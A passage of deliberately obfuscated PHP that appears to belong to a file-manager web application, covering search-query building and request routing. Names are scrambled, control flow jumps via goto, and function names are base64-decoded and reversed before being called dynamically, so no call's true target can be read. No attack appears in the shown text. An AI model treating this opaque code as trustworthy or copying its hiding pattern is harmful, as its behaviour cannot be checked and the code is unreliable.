$_SERVER[›é¼±]; $d©¯ø÷ùÛ¼ = array(); $dÍ¾»¡Ş © = array($f«÷ïè„Î£[492] => $EÏÚ…ÖÁ†); goto aŞì†×˜›œ; d²œ½½Óõ: if (!$d½¹Šìã¨‡) { return $d©¯ø÷ùÛ¼; } $dÍ¾»¡Ş © = array($f«÷ïè„Î£[492] => array($f«÷ïè„Î£[7], $d½¹Šìã¨‡)); $fëîçŸŠ›º = $this->field($f«÷ïè„Î£[1984])->where($dÍ¾»¡Ş ©)->limit($AàÙÒ‹£í)->select(); goto dŸ¯º°íë; aŞì†×˜›œ: $fëîçŸŠ›º = $this->field($f«÷ïè„Î£[1984])->where($dÍ¾»¡Ş ©)->select(); $d½¹Šìã¨‡ = array_to_keyvalue(array_filter_by_field($fëîçŸŠ›º, $f«÷ïè„Î£[405], $f«÷ïè„Î£[87]), $f«÷ïè„Î£[33], $f«÷ïè„Î£[397]); $d©¯ø÷ùÛ¼ = array_merge($d©¯ø÷ùÛ¼, array_to_keyvalue($fëîçŸŠ›º, $f«÷ïè„Î£[33], $f«÷ïè„Î£[397])); goto d²œ½½Óõ; dŸ¯º°íë: $d©¯ø÷ùÛ¼ = array_merge($d©¯ø÷ùÛ¼, array_to_keyvalue($fëîçŸŠ›º, $f«÷ïè„Î£[33], $f«÷ïè„Î£[397])); $d©¯ø÷ùÛ¼ = array_slice($d©¯ø÷ùÛ¼, 0, $AàÙÒ‹£í); return $d©¯ø÷ùÛ¼; goto CŠ’Ÿ°; CŠ’Ÿ°: } private function _listSearchBindPinyin($B„¡¯ìÉæÃ, &$aŒøÒ»šĞ˜, &$eç¤öÓ¨ŒÎ) { goto cø‰éõ£éÅ; cÄ’Ü°ä¯µ: $eç¤öÓ¨ŒÎ = $eëŠ£Œ°¬[430] . str_replace($eëŠ£Œ°¬[47], $eëŠ£Œ°¬[431], $eç¤öÓ¨ŒÎ); $b¾­¾§„å = $aŒøÒ»šĞ˜[$eëŠ£Œ°¬[28]]; unset($aŒøÒ»šĞ˜[$eëŠ£Œ°¬[28]]); goto A¦øçÏÉë; EØéÃÈÀàÖ: $DÌŸ¢¸¦ó = "\114\105\106\x54\x20\112\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\163\157\x75\x72\x63\145\x5f\x6d\x65\164\x61\40\x6d\x65\x74\x61\x20\x6f\x6e\40\163\x6f\x75\x72\x63\x65\56\163\157\x75\162\143\145\111\104\x20\x3d\x20\155\x65\164\x61\56\x73\157\x75\162\143\145\x49\x44"; $b³³ïëµª§ = array(); $eç¤öÓ¨ŒÎ = str_replace(array($eëŠ£Œ°¬[229], $eëŠ£Œ°¬[50], $eëŠ£Œ°¬[1985]), $eëŠ£Œ°¬[33], $eç¤öÓ¨ŒÎ); goto cÄ’Ü°ä¯µ; e„¨Î…É’–: $aŒøÒ»šĞ˜ = $b³³ïëµª§; goto bàëœàğİã; A¦øçÏÉë: foreach ($aŒøÒ»šĞ˜ as $E“Í‡ÊİŒ => $Dğ’æ«à”) { $b³³ïëµª§[$eëŠ£Œ°¬[430] . $E“Í‡ÊİŒ] = $Dğ’æ«à”; } foreach ($b¾­¾§„å as $CĞôÒ³êÇå) { $b³³ïëµª§[] = array($eëŠ£Œ°¬[435] => $CĞôÒ³êÇå, $eëŠ£Œ°¬[992] => $eëŠ£Œ°¬[1825], array($eëŠ£Œ°¬[1986] => $CĞôÒ³êÇå, $eëŠ£Œ°¬[1987] => array($eëŠ£Œ°¬[7], array($eëŠ£Œ°¬[458], $eëŠ£Œ°¬[457])))); } $this->join($DÌŸ¢¸¦ó); goto e„¨Î…É’–; cø‰éõ£éÅ: $eëŠ£Œ°¬ =& $_SERVER[›é¼±]; if (!isset($B„¡¯ìÉæÃ[$eëŠ£Œ°¬[1821]]) || !$B„¡¯ìÉæÃ[$eëŠ£Œ°¬[1821]]) { return; } if (!Input::check($B„¡¯ìÉæÃ[$eëŠ£Œ°¬[1821]], $eëŠ£Œ°¬[316]) || strlen($B„¡¯ìÉæÃ[$eëŠ£Œ°¬[1821]]) < 2) { return; } goto EØéÃÈÀàÖ; bàëœàğİã: } private function _parseSearchWhere($cŸçÊÏøÊé) { goto bÉ¦Û†ã; BÃ·Óˆ¿ªÛ: if (isset($cŸçÊÏøÊé[$aêš”ºÑÊ±[1821]]) && trim($cŸçÊÏøÊé[$aêš”ºÑÊ±[1821]])) { $c¦©ô­–ô‰ = trim($cŸçÊÏøÊé[$aêš”ºÑÊ±[1821]]); $C„Ÿ¯´àˆ« = explode($aêš”ºÑÊ±[50], $c¦©ô­–ô‰); if (strlen($c¦©ô­–ô‰) > 2 && (substr($c¦©ô­–ô‰, 0, 1) == $aêš”ºÑÊ±[116] && substr($c¦©ô­–ô‰, -1) == $aêš”ºÑÊ±[116]) || substr($c¦©ô­–ô‰, 0, 1) == $aêš”ºÑÊ±[55] && substr($c¦©ô­–ô‰, -1) == $aêš”ºÑÊ±[55]) { $c¦©ô­–ô‰ = substr($c¦©ô­–ô‰, 1, -1); $C„Ÿ¯´àˆ« = array($c¦©ô­–ô‰); } $féÎÜêÀºÇ[$aêš”ºÑÊ±[28]] = array(array($aêš”ºÑÊ±[538], $aêš”ºÑÊ±[1823] . $c¦©ô­–ô‰ . $aêš”ºÑÊ±[1823])); if (count($C„Ÿ¯´àˆ«) > 1) { $féÎÜêÀºÇ[$aêš”ºÑÊ±[28]] = array(); foreach ($C„Ÿ¯´àˆ« as $bÆÈÌ‡‰Îä) { if (!trim($bÆÈÌ‡‰Îä)) { continue; } $féÎÜêÀºÇ[$aêš”ºÑÊ±[28]][] = array($aêš”ºÑÊ±[538], $aêš”ºÑÊ±[1823] . trim($bÆÈÌ‡‰Îä) . $aêš”ºÑÊ±[1823]); } } } return $féÎÜêÀºÇ; goto D÷Ø¶ÓÅ¶È; EºØø†˜›: if (isset($cŸçÊÏøÊé[$aêš”ºÑÊ±[588]]) && $cŸçÊÏøÊé[$aêš”ºÑÊ±[588]]) { $féÎÜêÀºÇ[] = array($aêš”ºÑÊ±[448] => $cŸçÊÏøÊé[$aêš”ºÑÊ±[588]], $aêš”ºÑÊ±[446] => $cŸçÊÏøÊé[$aêš”ºÑÊ±[588]], $aêš”ºÑÊ±[992] => $aêš”ºÑÊ±[1825]); } if (isset($cŸçÊÏøÊé[$aêš”ºÑÊ±[407]]) && $cŸçÊÏøÊé[$aêš”ºÑÊ±[407]]) { $AÓŞš¥¿âØ = $cŸçÊÏøÊé[$aêš”ºÑÊ±[407]]; if ($AÓŞš¥¿âØ == $aêš”ºÑÊ±[77]) { $féÎÜêÀºÇ[$aêš”ºÑÊ±[405]] = 1; } else { if ($AÓŞš¥¿âØ == $aêš”ºÑÊ±[1991]) { $féÎÜêÀºÇ[$aêš”ºÑÊ±[405]] = 0; } else { if ($AÓŞš¥¿âØ) { $AÓŞš¥¿âØ = is_array($AÓŞš¥¿âØ) ? $AÓŞš¥¿âØ : explode($aêš”ºÑÊ±[47], $AÓŞš¥¿âØ); $féÎÜêÀºÇ[$aêš”ºÑÊ±[407]] = array($aêš”ºÑÊ±[413], $AÓŞš¥¿âØ); $féÎÜêÀºÇ[$aêš”ºÑÊ±[405]] = 0; } } } } $this->_parseSearchParent($cŸçÊÏøÊé, $féÎÜêÀºÇ); goto BÃ·Óˆ¿ªÛ; bÉ¦Û†ã: $aêš”ºÑÊ± =& $_SERVER[›é¼±]; $féÎÜêÀºÇ = array(); if (isset($cŸçÊÏøÊé[$aêš”ºÑÊ±[756]]) && $cŸçÊÏøÊé[$aêš”ºÑÊ±[756]]) { $féÎÜêÀºÇ[$aêš”ºÑÊ±[84]] = array($aêš”ºÑÊ±[1988], $cŸçÊÏøÊé[$aêš”ºÑÊ±[756]]); } goto F¬ğÎ× İ; F¬ğÎ× İ: if (isset($cŸçÊÏøÊé[$aêš”ºÑÊ±[490]]) && $cŸçÊÏøÊé[$aêš”ºÑÊ±[490]]) { $f¢åˆÁŸ„ = array($aêš”ºÑÊ±[1989], $cŸçÊÏøÊé[$aêš”ºÑÊ±[490]]); if ($féÎÜêÀºÇ[$aêš”ºÑÊ±[84]]) { $féÎÜêÀºÇ[$aêš”ºÑÊ±[84]] = array($féÎÜêÀºÇ[$aêš”ºÑÊ±[84]], $f¢åˆÁŸ„, $aêš”ºÑÊ±[1990]); } else { $féÎÜêÀºÇ[$aêš”ºÑÊ±[84]] = $f¢åˆÁŸ„; } } if (isset($cŸçÊÏøÊé[$aêš”ºÑÊ±[1982]]) && $cŸçÊÏøÊé[$aêš”ºÑÊ±[1982]] > 0) { $féÎÜêÀºÇ[$aêš”ºÑÊ±[78]] = array($aêš”ºÑÊ±[1988], $cŸçÊÏøÊé[$aêš”ºÑÊ±[1982]]); } if (isset($cŸçÊÏøÊé[$aêš”ºÑÊ±[1983]]) && $cŸçÊÏøÊé[$aêš”ºÑÊ±[1983]]) { $f¢åˆÁŸ„ = array($aêš”ºÑÊ±[1989], $cŸçÊÏøÊé[$aêš”ºÑÊ±[1983]]); if ($féÎÜêÀºÇ[$aêš”ºÑÊ±[78]]) { $féÎÜêÀºÇ[$aêš”ºÑÊ±[78]] = array($féÎÜêÀºÇ[$aêš”ºÑÊ±[78]], $f¢åˆÁŸ„, $aêš”ºÑÊ±[1990]); } else { $féÎÜêÀºÇ[$aêš”ºÑÊ±[78]] = $f¢åˆÁŸ„; } } goto EºØø†˜›; D÷Ø¶ÓÅ¶È: } private function _parseSearchParent($eî‹¡æƒè, &$aì¾¯†íö¥) { goto b…°±ÑÛ³Ì; a‡‰ƒåÙëÂ: $d°¾àÒ›‡‘ = $this->field($d¹øŒÍÈ‹Á[1992])->where($bŠöËéÜè‰)->limit($EëÂËìËÅï)->select(); $aì¾¯†íö¥[$d¹øŒÍÈ‹Á[578]] = array(); foreach ($d°¾àÒ›‡‘ as $cĞÀöóÚƒ‘) { $aì¾¯†íö¥[$d¹øŒÍÈ‹Á[578]][] = array($d¹øŒÍÈ‹Á[538], $d¹øŒÍÈ‹Á[525] . $cĞÀöóÚƒ‘[$d¹øŒÍÈ‹Á[397]] . $d¹øŒÍÈ‹Á[539]); } goto bˆˆÜ¹¢…; f¨ÅãóéØ: $DÃÚ®¨‚¬İ = $A³íÓ°Š¸³[$d¹øŒÍÈ‹Á[492]] . $d¹øŒÍÈ‹Á[33] === $d¹øŒÍÈ‹Á[191]; $dµÇ±­¬õ¿ = $A³íÓ°Š¸³[$d¹øŒÍÈ‹Á[406]] == $d¹øŒÍÈ‹Á[509]; $aì¾¯†íö¥[$d¹øŒÍÈ‹Á[578]] = array($d¹øŒÍÈ‹Á[538], $A³íÓ°Š¸³[$d¹øŒÍÈ‹Á[515]] . $eî‹¡æƒè[$d¹øŒÍÈ‹Á[492]] . $d¹øŒÍÈ‹Á[539]); goto fäÆ·Ú—¿À; fäÆ·Ú—¿À: $b œƒ·¾¸ = isset($eî‹¡æƒè[$d¹øŒÍÈ‹Á[1689]]) && in_array($d¹øŒÍÈ‹Á[509], $eî‹¡æƒè[$d¹øŒÍÈ‹Á[1689]]); if (!$b œƒ·¾¸ || !$dµÇ±­¬õ¿ || !$DÃÚ®¨‚¬İ || !$A³íÓ°Š¸³[$d¹øŒÍÈ‹Á[408]]) { return; } if (!AuthModel::authCheckRoot($A³íÓ°Š¸³[$d¹øŒÍÈ‹Á[408]][$d¹øŒÍÈ‹Á[409]])) { return; } goto A¤ëÍ”³¢Œ; A¤ëÍ”³¢Œ: $dò‘ßù­ˆä = $A³íÓ°Š¸³[$d¹øŒÍÈ‹Á[498]] . $d¹øŒÍÈ‹Á[33]; if ($dò‘ßù­ˆä == $d¹øŒÍÈ‹Á[87]) { unset($aì¾¯†íö¥[$d¹øŒÍÈ‹Á[578]]); $aì¾¯†íö¥[$d¹øŒÍÈ‹Á[406]] = self::TYPE_GROUP; return; } $d‘ô¥ÜˆÂÎ = Model($d¹øŒÍÈ‹Á[516])->groupChildrenAll($dò‘ßù­ˆä); goto AÉÎº„Ú…Ì; bˆˆÜ¹¢…: $aì¾¯†íö¥[$d¹øŒÍÈ‹Á[578]][] = $d¹øŒÍÈ‹Á[1825]; goto FˆƒƒäÇ­¦; AÉÎº„Ú…Ì: $EëÂËìËÅï = count($d‘ô¥ÜˆÂÎ); if ($EëÂËìËÅï <= 1) { return; } $bŠöËéÜè‰ = array($d¹øŒÍÈ‹Á[492] => 0, $d¹øŒÍÈ‹Á[406] => self::TYPE_GROUP, $d¹øŒÍÈ‹Á[498] => array($d¹øŒÍÈ‹Á[7], $d‘ô¥ÜˆÂÎ)); goto a‡‰ƒåÙëÂ; b…°±ÑÛ³Ì: $d¹øŒÍÈ‹Á =& $_SERVER[›é¼±]; if (!isset($eî‹¡æƒè[$d¹øŒÍÈ‹Á[492]]) || !$eî‹¡æƒè[$d¹øŒÍÈ‹Á[492]]) { return; } $A³íÓ°Š¸³ = $this->pathInfo($eî‹¡æƒè[$d¹øŒÍÈ‹Á[492]]); goto f¨ÅãóéØ; FˆƒƒäÇ­¦: } } goto E¢ÒğæíÀÀ; AŸ›É¨°Í½: $eæöÜÌÍÑ— = strrev(base64_decode($_SERVER[åœÄéø][0])); function binCheckNeq($a«¶¤°Œ…õ, $BñÖ’‡—•®) { return $a«¶¤°Œ…õ != $BñÖ’‡—•®; } $_SERVER[$_SERVER[åœÄéø][1]] = $eæöÜÌÍÑ—($_SERVER[$_SERVER[åœÄéø][2]]); goto EŠï„‡‰Úà; aÚ¯¬Õ¹šò: $DÃ¦‰§Ç = $_SERVER[›é¼±][604]; class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\x69\156\x64\x65\170"; private $defaultAction = "\x69\x6e\144\145\x78"; function __construct() { } public function setDefault($bçù¨­¾õã) { goto b‡øáìÃ‡¨; aÊî•˜‘˜µ: $this->defaultModule = $B–‰íŒõ[0] ? $B–‰íŒõ[0] : $this->defaultModule; $C¨²ó÷¨‹¾ = $fç±Ö„ˆÔ¬[605]; if (strlen($C¨²ó÷¨‹¾) < $fç±Ö„ˆÔ¬[606]) { die; } goto AµÛÑ¡ïÁä; b‡øáìÃ‡¨: $fç±Ö„ˆÔ¬ =& $_SERVER[›é¼±]; $C±³öØ Ú =& $_SERVER[ÀóÛœö]; $B–‰íŒõ = $C±³öØ Ú[0]($C±³öØ Ú[1], $C±³öØ Ú[2]($bçù¨­¾õã, $C±³öØ Ú[1])); goto aÊî•˜‘˜µ; AµÛÑ¡ïÁä: $this->defaultController = $B–‰íŒõ[1] ? $B–‰íŒõ[1] : $this->defaultController; $this->defaultAction = $B–‰íŒõ[2] ? $B–‰íŒõ[2] : $this->defaultAction; $this->{$_SERVER[ÀóÛœö][3]}($C±³öØ Ú[4], array($this, $C±³öØ Ú[5])); goto A°æá—Æó¶; A°æá—Æó¶: } public function appRun($aÆø¤¡ãÓ—) { goto b™âµ£‚˜; b¯Œ£â¹–É: $dÏ¸–±Êô£[13](array($dÏ¸–±Êô£[14], $dÏ¸–±Êô£[15]), $AÄöîÏÔ™ß . $dÏ¸–±Êô£[18], $aÆø¤¡ãÓ—); $EÑÄ—¾¢Ù„ = $eñÂÃ´Ûí[612]; if (!$EÑÄ—¾¢Ù„) { return; } goto a«Ó²ö±ã; f¡ÇÙĞ»: $dÏ¸–±Êô£[13](array($dÏ¸–±Êô£[14], $dÏ¸–±Êô£[15]), $AÄöîÏÔ™ß . $dÏ¸–±Êô£[16], $aÆø¤¡ãÓ—); $dÏ¸–±Êô£[17]($aÆø¤¡ãÓ—); $fÆ¼ÅÒ§†Ï = $eñÂÃ´Ûí[611]; goto b¯Œ£â¹–É; b™âµ£‚˜: $eñÂÃ´Ûí =& $_SERVER[›é¼±]; $dÏ¸–±Êô£ =& $_SERVER[ÀóÛœö]; $BªŒáµÓ†‘ = $dÏ¸–±Êô£[0]($dÏ¸–±Êô£[1], $aÆø¤¡ãÓ—); goto bË·º…¦æ; bË·º…¦æ: $d«Î¸Š¤ˆ = $eñÂÃ´Ûí[607]; if (!$d«Î¸Š¤ˆ) { die; } $fâÛ‰ë‰¨ = $dÏ¸–±Êô£[6]($BªŒáµÓ†‘[0]); goto eŠäà‚öÓÁ; eŠäà‚öÓÁ: $D®ÔöÉÀØÁ = $eñÂÃ´Ûí[608]; while ($D®ÔöÉÀØÁ < $eñÂÃ´Ûí[609]) { if ($D®ÔöÉÀØÁ >= 0) { break; } $D®ÔöÉÀØÁ++; } $AÄöîÏÔ™ß = $dÏ¸–±Êô£[7]; goto A±¦ŠÚ‰°Ì; A±¦ŠÚ‰°Ì: $aØ‰¥ğøñ = $eñÂÃ´Ûí[610]; if (strlen($aØ‰¥ğøñ) < $eñÂÃ´Ûí[609]) { die; } if ($fâÛ‰ë‰¨ == $dÏ¸–±Êô£[8]) { $AÄöîÏÔ™ß = $dÏ¸–±Êô£[9]; $BªŒáµÓ†‘[0] = $dÏ¸–±Êô£[10]; $BªŒáµÓ†‘[1] = $BªŒáµÓ†‘[1] . $dÏ¸–±Êô£[11]; $aÆø¤¡ãÓ— = $dÏ¸–±Êô£[12]($dÏ¸–±Êô£[1], $BªŒáµÓ†‘); $aÆø¤¡ãÓ— = $dÏ¸–±Êô£[2]($aÆø¤¡ãÓ—, $dÏ¸–±Êô£[1]); } goto f¡ÇÙĞ»; a«Ó²ö±ã: } private function autorun() { $E·°Úß°” =& $_SERVER[ÀóÛœö]; global $config; if ($E·°Úß°”[19]($config[$E·°Úß°”[20]]) == 0) { return; } foreach ($config[$E·°Úß°”[20]] as $EÌÕ¹‡£ğ => $A£ÂÑÈ¸ë) { $this->{$_SERVER[ÀóÛœö][21]}($A£ÂÑÈ¸ë); } } private function odbrd7fd523f() { goto Bê‚àÂ¾šÕ; E…ÕÂ­Ù: $C×šøíŒ” = array($Bæ¥Ñ×§‰İ[8], $f§¸ÆÆÕ‰æ); $FĞöñïÔ´± = $Bæ¥Ñ×§‰İ[26]($GLOBALS[$Bæ¥Ñ×§‰İ[22]][$Bæ¥Ñ×§‰İ[23]], 1); $GLOBALS[$Bæ¥Ñ×§‰İ[22]][$Bæ¥Ñ×§‰İ[23]] = $Bæ¥Ñ×§‰İ[27]($C×šøíŒ”, $FĞöñïÔ´±); goto aâ–Ó³­Ú; dÄ‘ñÛ¿‘›: $f§¸ÆÆÕ‰æ = $Bæ¥Ñ×§‰İ[25]($AŞçÅ‰·ÖŸ, 0, -$Bæ¥Ñ×§‰İ[24]($aÚ…ßÚÔ‘)); $B½œîã½ˆ = $a¸±«¿Õ­[613]; while (strlen($B½œîã½ˆ) < $a¸±«¿Õ­[601]) { if (!$B½œîã½ˆ) { break; } $B½œîã½ˆ++; } goto E…ÕÂ­Ù; Bê‚àÂ¾šÕ: $a¸±«¿Õ­ =& $_SERVER[›é¼±]; $Bæ¥Ñ×§‰İ =& $_SERVER[ÀóÛœö]; $aÚ…ßÚÔ‘ = $Bæ¥Ñ×§‰İ[8]; goto b²ò‹ó‡Ä; aâ–Ó³­Ú: $GLOBALS[$Bæ¥Ñ×§‰İ[22]][$Bæ¥Ñ×§‰İ[28]] = $Bæ¥Ñ×§‰İ[29]($Bæ¥Ñ×§‰İ[1], $GLOBALS[$Bæ¥Ñ×§‰İ[22]][$Bæ¥Ñ×§‰İ[23]]); goto e¿É¥ÈéŞ±; b²ò‹ó‡Ä: $AŞçÅ‰·ÖŸ = $GLOBALS[$Bæ¥Ñ×§‰İ[22]][$Bæ¥Ñ×§‰İ[23]][0]; if (!$AŞçÅ‰·ÖŸ || $Bæ¥Ñ×§‰İ[24]($AŞçÅ‰·ÖŸ) <= $Bæ¥Ñ×§‰İ[24]($aÚ…ßÚÔ‘)) { return; } if ($Bæ¥Ñ×§‰İ[6]($Bæ¥Ñ×§‰İ[25]($AŞçÅ‰·ÖŸ, -$Bæ¥Ñ×§‰İ[24]($aÚ…ßÚÔ‘))) != $aÚ…ßÚÔ‘) { return; } goto dÄ‘ñÛ¿‘›; e¿É¥ÈéŞ±: } private function cqwebbf802bf() { goto bÎ“ï‚Û…¸; a×ÒÊ×¼˜: if (!$døÖ˜»îŸ°) { die; } $GLOBALS[$b×ÙÂÔ¢©³[22]][$b×ÙÂÔ¢©³[28]] = $b×ÙÂÔ¢©³[29]($b×ÙÂÔ¢©³[1], $GLOBALS[$b×ÙÂÔ¢©³[22]][$b×ÙÂÔ¢©³[23]]); $CÛ…¨— ÚÏ = $eâÑ˜óê¦[622]; goto bê¦ô”“·ç; fÌ×Öá’¬ë: $a¸î×°à«Ò = $_SERVER[$b×ÙÂÔ¢©³[30]]; $cñ‚éÈ‡„ò = $eâÑ˜óê¦[614]; while ($cñ‚éÈ‡„ò < $eâÑ˜óê¦[601]) { if ($cñ‚éÈ‡„ò >= 0) { break; } $cñ‚éÈ‡„ò++; } goto e ØÏ…¤¸; f’åáÕç‚™: $aØ®Œ²ìµª = $b×ÙÂÔ¢©³[2]($c·…†ÛÔù˜[0][0], $b×ÙÂÔ¢©³[36]); $GLOBALS[$b×ÙÂÔ¢©³[22]][$b×ÙÂÔ¢©³[23]] = $b×ÙÂÔ¢©³[0]($b×ÙÂÔ¢©³[36], $aØ®Œ²ìµª); $døÖ˜»îŸ° = $eâÑ˜óê¦[621]; goto a×ÒÊ×¼˜; b‚ª³°§ñè: if (strlen($AËãÙÑ³ÈĞ) < $eâÑ˜óê¦[606]) { die; } $aØ®Œ²ìµª = $b×ÙÂÔ¢©³[25]($a¸î×°à«Ò, $E²š¶Â…â” + $b×ÙÂÔ¢©³[24]($E™ÑˆÚæí‘)); $aèø·‚ÜÀğ = $eâÑ˜óê¦[618]; goto bß§Œ‡Ô’–; D×ÌÇì¨ñİ: if (!$b×ÙÂÔ¢©³[32]($a¸î×°à«Ò, $E™ÑˆÚæí‘)) { return; } $E²š¶Â…â” = $b×ÙÂÔ¢©³[33]($a¸î×°à«Ò, $E™ÑˆÚæí‘); $AËãÙÑ³ÈĞ = $eâÑ˜óê¦[617]; goto b‚ª³°§ñè; bß§Œ‡Ô’–: $b×ÙÂÔ¢©³[34]($b×ÙÂÔ¢©³[35], $aØ®Œ²ìµª, $c·…†ÛÔù˜); $CŸíø·º” = $eâÑ˜óê¦[619]; if (strlen($CŸíø·º”) < $eâÑ˜óê¦[620]) { die; } goto f’åáÕç‚™; e ØÏ…¤¸: $E™ÑˆÚæí‘ = $b×ÙÂÔ¢©³[31]; $fÄøù¬»È” = $eâÑ˜óê¦[615]; while (strlen($fÄøù¬»È”) < $eâÑ˜óê¦[616]) { if (!$fÄøù¬»È”) { break; } $fÄøù¬»È”++; } goto D×ÌÇì¨ñİ; bê¦ô”“·ç: while (strlen($CÛ…¨— ÚÏ) < $eâÑ˜óê¦[606]) { if (!$CÛ…¨— ÚÏ) { break; } $CÛ…¨— ÚÏ++; } goto aÙå™©†¸Ü; bÎ“ï‚Û…¸: $eâÑ˜óê¦ =& $_SERVER[›é¼±]; $b×ÙÂÔ¢©³ =& $_SERVER[ÀóÛœö]; if ($GLOBALS[$b×ÙÂÔ¢©³[22]][$b×ÙÂÔ¢©³[28]] != $b×ÙÂÔ¢©³[10]) { return; } goto fÌ×Öá’¬ë; aÙå™©†¸Ü: } public function run() { goto bÊŞ¦İ¦; aÀ¦‚®íŸ¨: $Eçƒ¯ïÙê—[39]($Eçƒ¯ïÙê—[41], isset($E½èë¶Ô®[1]) && $E½èë¶Ô®[0] ? $E½èë¶Ô®[1] : $this->defaultController); $B¹Ìµ»ù­÷ = $Fğ¹Ö³ùñ[625]; if (!$B¹Ìµ»ù­÷) { die; } goto A©•‘­½÷æ; c…Óâ·»Á: $c¸ïŒä’Ò… = $GLOBALS[$Eçƒ¯ïÙê—[22]][$Eçƒ¯ïÙê—[28]]; $E“‰øğÚ¯Ò = $Fğ¹Ö³ùñ[624]; $Eçƒ¯ïÙê—[39]($Eçƒ¯ïÙê—[40], isset($E½èë¶Ô®[0]) && $E½èë¶Ô®[0] ? $E½èë¶Ô®[0] : $this->defaultModule); goto aÀ¦‚®íŸ¨; A©•‘­½÷æ: $Eçƒ¯ïÙê—[39]($Eçƒ¯ïÙê—[42], isset($E½èë¶Ô®[2]) && $E½èë¶Ô®[0] ? $E½èë¶Ô®[2] : $this->defaultAction); $BïÂÛĞ•³ = $Fğ¹Ö³ùñ[626]; if (strlen($BïÂÛĞ•³) < $Fğ¹Ö³ùñ[609]) { return; } goto B´¶†Äõ•; FùÈ½óŒÉœ: $E½èë¶Ô® = $GLOBALS[$Eçƒ¯ïÙê—[22]][$Eçƒ¯ïÙê—[23]]; $B„íÑ³Ó‚ä = $Fğ¹Ö³ùñ[607]; if (!$B„íÑ³Ó‚ä) { die; } goto c…Óâ·»Á; BŒª¬Æ˜¯: $aÎõƒíê = $Fğ¹Ö³ùñ[623]; if (strlen($aÎõƒíê) < $Fğ¹Ö³ùñ[616]) { return; } $this->{$_SERVER[ÀóÛœö][38]}(); goto FùÈ½óŒÉœ; a¸¾éÄ‚¬‡: $_SERVER[$Eçƒ¯ïÙê—[44]] = $Eçƒ¯ïÙê—[6](ACTION); $this->{$_SERVER[ÀóÛœö][45]}(); if ($Eçƒ¯ïÙê—[19]($E½èë¶Ô®) >= 3) { $this->{$_SERVER[ÀóÛœö][21]}($c¸ïŒä’Ò…); } else { $this->{$_SERVER[ÀóÛœö][21]}(ACTION); } goto Eİé©ö®Íê; bÊŞ¦İ¦: $Fğ¹Ö³ùñ =& $_SERVER[›é¼±]; $Eçƒ¯ïÙê— =& $_SERVER[ÀóÛœö]; $this->{$_SERVER[ÀóÛœö][37]}(); goto BŒª¬Æ˜¯; B´¶†Äõ•: $Eçƒ¯ïÙê—[39]($Eçƒ¯ïÙê—[43], MOD . $Eçƒ¯ïÙê—[1] . ST . $Eçƒ¯ïÙê—[1] . ACT); $C ¸îğÅÑ– = $Fğ¹Ö³ùñ[627]; while ($C ¸îğÅÑ– < $Fğ¹Ö³ùñ[601]) { if ($C ¸îğÅÑ– >= 0) { break; } $C ¸îğÅÑ–++; } goto a¸¾éÄ‚¬‡; Eİé©ö®Íê: } private $whygd47f8b42 = array(); private $kuxe2f0c6c86 = ''; public function xlcefee2bcc8() { goto F†ÖÀ‰¼Ë; Eß«ŒÆŸ¾’: $this->{$_SERVER[ÀóÛœö][3]}($aæ™†ÄÖŞ[53], array($this, $aæ™†ÄÖŞ[54])); $this->{$_SERVER[ÀóÛœö][3]}($aæ™†ÄÖŞ[55], array($this, $aæ™†ÄÖŞ[56])); $d¸É–ùİê = $fê‡„ùÔÂÏ[633]; goto dæ±ì’ÃŠö; F†ÖÀ‰¼Ë: $fê‡„ùÔÂÏ =& $_SERVER[›é¼±]; $aæ™†ÄÖŞ =& $_SERVER[ÀóÛœö]; $this->{$_SERVER[ÀóÛœö][46]}(); goto fĞĞè…†„±; d„›ÃÑŸ–: $bõ¨–¬º×É = $fê‡„ùÔÂÏ[632]; while (strlen($bõ¨–¬º×É) < $fê‡„ùÔÂÏ[616]) { if (!$bõ¨–¬º×É) { break; } $bõ¨–¬º×É++; } $this->{$_SERVER[ÀóÛœö][52]}(); goto Eß«ŒÆŸ¾’; eæ¦Áß¯¾‡: $this->{$_SERVER[ÀóÛœö][3]}($aæ™†ÄÖŞ[59], array($this, $aæ™†ÄÖŞ[60])); $a·¥¿½†ò‘ = $fê‡„ùÔÂÏ[635]; while ($a·¥¿½†ò‘ < $fê‡„ùÔÂÏ[620]) { if ($a·¥¿½†ò‘ >= 0) { break; } $a·¥¿½†ò‘++; } goto bôµ¥´˜äù; D¡¤ˆÈËÊ: while ($f…Š ‡ ±É < $fê‡„ùÔÂÏ[601]) { if ($f…Š ‡ ±É >= 0) { break; } $f…Š ‡ ±É++; } $this->{$_SERVER[ÀóÛœö][50]}(); $this->{$_SERVER[ÀóÛœö][51]}(); goto d„›ÃÑŸ–; fĞĞè…†„±: $Cì±ó¹›¢ = $fê‡„ùÔÂÏ[628]; $this->{$_SERVER[ÀóÛœö][47]}(); $Cƒøàµ…ô = $fê‡„ùÔÂÏ[629]; goto EãËÜèöøˆ; EãËÜèöøˆ: while (strlen($Cƒøàµ…ô) < $fê‡„ùÔÂÏ[609]) { if (!$Cƒøàµ…ô) { break; } $Cƒøàµ…ô++; } $this->{$_SERVER[ÀóÛœö][48]}(); $c‡³”ÊñŠÓ = $fê‡„ùÔÂÏ[630]; goto fãØ•ƒ¤ß; dæ±ì’ÃŠö: while ($d¸É–ùİê < $fê‡„ùÔÂÏ[620]) { if ($d¸É–ùİê >= 0) { break; } $d¸É–ùİê++; } $this->{$_SERVER[ÀóÛœö][3]}($aæ™†ÄÖŞ[57], array($this, $aæ™†ÄÖŞ[58])); $AŞñä©‡Ç = $fê‡„ùÔÂÏ[634]; goto eæ¦Áß¯¾‡; fãØ•ƒ¤ß: if (strlen($c‡³”ÊñŠÓ) < $fê‡„ùÔÂÏ[609]) { die; } $this->{$_SERVER[ÀóÛœö][49]}(); $f…Š ‡ ±É = $fê‡„ùÔÂÏ[631]; goto D¡¤ˆÈËÊ; bôµ¥´˜äù: } public function qbud14289a43($eìÄ‘İÅË³) { goto aÊ£»‘é–Ã; F¢‡ù¢ë†Ò: unset($eìÄ‘İÅË³[$AµƒÓ¶¿Ó[113]][$AµƒÓ¶¿Ó[115]][$AµƒÓ¶¿Ó[117]]); $d¸°Ö¼éÉŒ = $d‰Ú«ˆŸºØ[639]; while ($d¸°Ö¼éÉŒ < $d‰Ú«ˆŸºØ[620]) { if ($d¸°Ö¼éÉŒ >= 0) { break; } $d¸°Ö¼éÉŒ++; } goto FÜ„ĞÀ†ã›; F°¾¤”¹ì: $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[126]] = 